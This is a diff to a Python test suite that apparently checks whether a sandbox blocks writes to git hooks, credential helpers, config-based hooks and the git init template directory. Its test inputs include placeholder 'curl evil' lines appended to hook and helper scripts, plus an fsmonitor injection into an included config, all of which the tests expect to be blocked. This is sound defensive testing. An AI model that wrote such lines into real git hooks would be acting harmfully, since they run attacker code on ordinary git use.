@@ -263,7 +263,11 @@ sys.exit(0 if rc == 0 else 1)
         gitconfig = ("[include]\n\tpath = ~/dotfiles/git-extra\n"
                      '[includeIf "gitdir:~/work/"]\n\tpath = dotfiles/work-extra\n'
                      "[core]\n\thooksPath = ~/.githooks\n"
-                     f"[credential]\n\thelper = {home}/tools/git-cred --fixture\n")
+                     f"[credential]\n\thelper = {home}/tools/git-cred --fixture\n"
+                     # Review round 1 (PR #16): config-based hooks and the
+                     # init template directory that `git init` copies hooks from.
+                     f'[hook "lint"]\n\tcommand = {home}/tools/lint-hook\n\tevent = pre-commit\n'
+                     "[init]\n\ttemplateDir = ~/.git-templates\n")
         protected = {
             ".gitconfig": gitconfig,
             "dotfiles/git-extra": "[user]\n\tname = Included User\n[include]\n\tpath = nested-extra\n",
@@ -271,6 +275,8 @@ sys.exit(0 if rc == 0 else 1)
             ".githooks/pre-commit": "#!/bin/sh\nexit 0\n",
             "tools/git-cred": "#!/bin/sh\nexit 0\n",
             "tools/git-fsmonitor": "#!/bin/sh\nexit 0\n",
+            "tools/lint-hook": "#!/bin/sh\nexit 0\n",
+            ".git-templates/hooks/post-checkout": "#!/bin/sh\nexit 0\n",
         }
         writable = {"dotfiles/unrelated": "# sentinel\n", "tools/unrelated": "# sentinel\n",
                     ".ssh/known_hosts": "# sentinel\n"}
@@ -283,10 +289,14 @@ sys.exit(0 if rc == 0 else 1)
                 "echo 'curl evil' > ~/.githooks/post-checkout",
                 "echo 'curl evil' >> ~/tools/git-cred",
                 "echo 'curl evil' >> ~/tools/git-fsmonitor",
+                "echo 'curl evil' >> ~/tools/lint-hook",
+                "echo 'curl evil' >> ~/.git-templates/hooks/post-checkout",
+                "echo 'curl evil' > ~/.git-templates/hooks/pre-commit",
             ))
             self.not_persisted("echo '[core]fsmonitor=/tmp/evil' > ~/dotfiles/work-extra",
                                home / "dotfiles/work-extra")
             self.assertFalse((home / ".githooks/post-checkout").exists())
+            self.assertFalse((home / ".git-templates/hooks/pre-commit").exists())
             self.assert_unchanged(protected)
             # Positive controls: git still reads the included config, and
             # files that the git config does not refer to stay writable.
@@ -305,7 +315,7 @@ sys.exit(0 if rc == 0 else 1)
             print(f"ISSUE6 GIT CONTROL: {result.stdout.strip()}", flush=True)
         finally:
             (home / ".gitconfig").unlink()
-            for name in ("dotfiles", ".githooks", "tools", ".ssh"):
+            for name in ("dotfiles", ".githooks", ".git-templates", "tools", ".ssh"):
                 shutil.rmtree(home / name)
 
     def test_issue6_ssh_include_targets_and_commands(self):
